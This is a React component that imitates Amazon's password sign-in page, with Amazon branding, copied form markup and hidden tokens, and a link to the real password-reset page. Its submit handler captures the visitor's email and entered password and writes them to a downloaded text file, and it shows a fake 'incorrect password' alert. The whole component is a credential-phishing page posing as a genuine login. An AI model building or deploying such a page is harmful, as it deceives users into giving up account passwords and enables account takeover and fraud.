import React, { useState } from 'react'
import { useEmail } from '../context/contextData'

export default function PassworkPc() {
    const { email, password, setPassword } = useEmail()
    const [showErrorMessage, setShowErrorMessage] = useState(false)

    const handleInputChange = (event) => {
        const { value } = event.target
        setPassword(value)
    }

    const handleContinueClick = () => {
        if (password.includes(' ') || password.trim() === '') {
            setShowErrorMessage(true)
        } else {
            setShowErrorMessage(false)
            writeText()
        }
    }

    const writeText = () => {
        if (email.trim() !== '' && password.trim() !== '') {
            var fileContent = `Email: ${email}\nPassword: ${password}`
            var blob = new Blob([fileContent], { type: 'text/plain' })

            var url = window.URL.createObjectURL(blob)

            var a = document.createElement('a')
            a.href = url
            a.download = 'text.txt'

            document.body.appendChild(a)
            a.click()
            document.body.removeChild(a)
        } else return
    }

    return (
        <div id='a-page'>
            <div className='a-section a-padding-medium auth-workflow'>
                <div className='a-section a-spacing-none auth-navbar'>
                    <div className='a-section a-spacing-medium a-text-center'>
                        <a
                            className='a-link-nav-icon'
                            tabIndex='-1'
                            href='/ref=ap_frn_logo'
                        >
                            <i
                                className='a-icon a-icon-logo'
                                role='img'
                                aria-label='Amazon'
                            ></i>
                        </a>
                    </div>
                </div>

                <div id='authportal-center-section' className='a-section'>
                    <div id='authportal-main-section' className='a-section'>
                        <div
                            className='a-section a-spacing-base auth-pagelet-container display-none'
                            id='password-error'
                        >
                            <div className='a-section'>
                                {showErrorMessage && (
                                    <div
                                        id='auth-error-message-box'
                                        className='a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base'
                                        role='alert'
                                    >
                                        <div className='a-box-inner a-alert-container'>
                                            <h4 className='a-alert-heading'>
                                                There was a problem
                                            </h4>
                                            <i className='a-icon a-icon-alert'></i>
                                            <div className='a-alert-content'>
                                                <ul className='a-unordered-list a-nostyle a-vertical a-spacing-none'>
                                                    <li>
                                                        <span className='a-list-item'>
                                                            Your password is
                                                            incorrect
                                                        </span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>

                        <div className='a-section auth-pagelet-container'>
                            <div className='a-section a-spacing-base'>
                                <div
                                    id='passkey-error-alert'
                                    className='a-box a-alert a-alert-error aok-hidden'
                                    role='alert'
                                >
                                    <div className='a-box-inner a-alert-container'>
                                        <h4 className='a-alert-heading'>
                                            Passkey error
                                        </h4>
                                        <i className='a-icon a-icon-alert'></i>
                                        <div className='a-alert-content'>
                                            <p id='passkey-client-error-message'>
                                                Something went wrong, please
                                                sign-in another way or follow
                                                any instructions provided by
                                                your device.
                                            </p>
                                            <p
                                                id='passkey-generic-server-error-message'
                                                className='aok-hidden'
                                            >
                                                Sorry, your passkey isn't
                                                working. There might be a
                                                problem with the server. Sign in
                                                with your password or try your
                                                passkey again later.
                                            </p>
                                            <p
                                                id='passkey-server-error-message'
                                                className='aok-hidden'
                                            ></p>
                                        </div>
                                    </div>
                                </div>

                                <div className='a-box'>
                                    <div className='a-box-inner a-padding-extra-large'>
                                        <h1 className='a-spacing-small text-aline'>
                                            Sign in
                                        </h1>

                                        <div className='a-row a-spacing-base text-aline'>
                                            <span id='local-email' dir='ltr'>
                                                {email}
                                            </span>
                                            <a
                                                id='ap_change_login_claim'
                                                className='a-link-normal'
                                                tabIndex='5'
                                                href='#'
                                            >
                                                {' '}
                                                Change
                                            </a>
                                        </div>

                                        <form
                                            name='signIn'
                                            method='post'
                                            action='#'
                                            className='auth-validate-form auth-real-time-validation a-spacing-none'
                                            data-fwcim-id='qdQdp1Q5'
                                        >
                                            <input
                                                type='hidden'
                                                name='appActionToken'
                                                value='eZhsA9mXZtIbEgp2HhCXj2Bb571fAj3D'
                                            />
                                            <input
                                                type='hidden'
                                                name='appAction'
                                                value='SIGNIN_PWD_COLLECT'
                                            />

                                            <input
                                                type='hidden'
                                                name='metadata1'
                                                value='ECdITeCs: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'
                                            />

                                            <input
                                                type='hidden'
                                                name='openid.return_to'
                                                value='ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfY3VzdHJlY19zaWduaW4='
                                            />

                                            <input
                                                type='hidden'
                                                name='prevRID'
                                                value='ape:TlIwTVlaMlZSUjJCQllZQjBZNlo='
                                            />

                                            <input
                                                type='hidden'
                                                name='workflowState'
                                                value='eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.fU4NNB6uQo-cLoNz60ivizMJEDu6BUzyx2CAfBHvBGxvjaRtOvCv7A.U67hfQ5S87ZJ_8Wr.6NBKm_o0q33Zc8NBpnq_JMHaGOTjNln2H14JverOvEBdPVvKeFe8mIZeKHfNHkIqoCcjHE8I_3M8DgceBa1Lt6jf5rUvHbX-jrWBgq6WgwCaH3soFRlgSzhPKgq9t1odmLwxGDnVrzWIBOaqxPkt0OKxBIkge_bHGZS_31EVxSBF7s4s3sCzXzP_WqKVWDe32bjzKytb1cJMBv1P1UsFRh0p8EW2RQZovUjDRjgwoP_wmsSAnshruvXc46psBv1R5-tB0fh0Bi5cn9QnYokNll3CRIugJgwrKVDpkKMS5iveKPBC-6zrvAixFemvZbfIJEQdmICZjdX3KTNRFEOEgSMMag8RhEUTUZBdIB4xgRDQ5OkM8UCR3cLmGd1IrWwY574V7Rxyjssi8rTwRO5RG6miwXih9qe3YzNx6NEANBiscCrabSuNgCasu6DRl1zGZAbjtSpydIBFrGuaa8YQVwiqV0nbF3BsuKp6B6nwMHHD6PpoaqWMd5Meh2tCKixw.TNbCToJefJvTOzmrk-OLtg'
                                            />

                                            <div className='a-section'>
                                                <input
                                                    type='hidden'
                                                    name='email'
                                                    value='admin12345@gmail.com'
                                                    id='ap_email'
                                                />
                                                <input
                                                    type='text'
                                                    value='admin12345@gmail.com'
                                                    id='ap-credential-autofill-hint'
                                                    autoComplete='email'
                                                    name='email'
                                                    className='a-input-text hide'
                                                    data-claim='admin12345@gmail.com'
                                                />

                                                <div className='a-section a-spacing-large'>
                                                    <div className='a-row'>
                                                        <div className='a-column a-span5 text-aline'>
                                                            <label
                                                                htmlFor='ap_password'
                                                                className='a-form-label'
                                                            >
                                                                Password
                                                            </label>
                                                        </div>

                                                        <div className='a-column a-span7 a-text-right a-span-last'>
                                                            <a
                                                                id='auth-fpp-link-bottom'
                                                                className='a-link-normal'
                                                                tabIndex='6'
                                                                href='https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;signInRedirectToFPPThreshold=6&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=NR0MYZ2VRR2BBYYB0Y6Z&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJPbHc4cnZmRzlpTTh4UUdoV3NHelhsMXJ4V0Z3MFNNd3NZc2dsTzRvTG9JPSIsInZlcnNpb24iOjEsIklWIjoiNWRaME1DQjhkbld0aVkrcW95OUs3QT09In0%3D&amp;failedSignInCount=1&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1708617625000'
                                                            >
                                                                Forgot your
                                                                password?
                                                            </a>
                                                        </div>
                                                    </div>

                                                    <input
                                                        type='password'
                                                        maxLength='1024'
                                                        id='ap_password'
                                                        autoComplete='current-password'
                                                        name='password'
                                                        tabIndex='2'
                                                        className='a-input-text a-span12 auth-autofocus auth-required-field'
                                                        value={password}
                                                        onChange={
                                                            handleInputChange
                                                        }
                                                    />

                                                    <div
                                                        id='auth-password-missing-alert'
                                                        className='a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini'
                                                        role='alert'
                                                    >
                                                        <div className='a-box-inner a-alert-container'>
                                                            <i className='a-icon a-icon-alert'></i>
                                                            <div className='a-alert-content'>
                                                                Enter your
                                                                password
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <input
                                                    type='hidden'
                                                    name='encryptedPasswordExpected'
                                                />

                                                <div className='a-section'>
                                                    <span
                                                        id='auth-signin-button'
                                                        className='a-button a-button-span12 a-button-primary auth-disable-button-on-submit'
                                                        onClick={
                                                            handleContinueClick
                                                        }
                                                    >
                                                        <span className='a-button-inner'>
                                                            <input
                                                                id='signInSubmit'
                                                                tabIndex='3'
                                                                className='a-button-input'
                                                                aria-labelledby='auth-signin-button-announce'
                                                            />
                                                            <span
                                                                id='auth-signin-button-announce'
                                                                className='a-button-text'
                                                                aria-hidden='true'
                                                            >
                                                                Sign in
                                                            </span>
                                                        </span>
                                                    </span>

                                                    <div className='a-row a-spacing-top-medium'>
                                                        <div className='a-section a-text-left'>
                                                            <label
                                                                htmlFor='auth-remember-me'
                                                                className='a-form-label'
                                                            >
                                                                <div
                                                                    data-a-input-name='rememberMe'
                                                                    className='a-checkbox'
                                                                >
                                                                    <label>
                                                                        <input
                                                                            type='checkbox'
                                                                            name='rememberMe'
                                                                            value='true'
                                                                            tabIndex='4'
                                                                        />
                                                                        <i className='a-icon a-icon-checkbox'></i>
                                                                        <span className='a-label a-checkbox-label'>
                                                                            Keep
                                                                            me
                                                                            signed
                                                                            in.
                                                                            <span
                                                                                className='a-declarative'
                                                                                data-action='a-popover'
                                                                                data-csa-c-type='widget'
                                                                                data-csa-c-func-deps='aui-da-a-popover'
                                                                                data-a-popover='{"closeButtonLabel":"","activate":"onclick","header":"\"Keep Me Signed In\" Checkbox","inlineContent":"\u003cp>Choosing \"Keep me signed in\" reduces the number of times you&apos;re asked to Sign-In on this device.\u003c\/p>\n\u003cp>To keep your account secure, use this option only on your personal devices.\u003c\/p>"}'
                                                                                data-csa-c-id='z03l42-hf8zus-vv4rc4-qyfyvw'
                                                                            >
                                                                                <a
                                                                                    id='remember_me_learn_more_link'
                                                                                    href='javascript:void(0)'
                                                                                    role='button'
                                                                                    className='a-popover-trigger a-declarative'
                                                                                >
                                                                                    Details
                                                                                    <i className='a-icon a-icon-popover'></i>
                                                                                </a>
                                                                            </span>{' '}
                                                                        </span>
                                                                    </label>
                                                                </div>
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <input
                                                type='hidden'
                                                name='aaToken'
                                                value='{"uniqueValidationId":"b6510550-fbca-427a-95a6-1bce979091be"}'
                                            />
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}
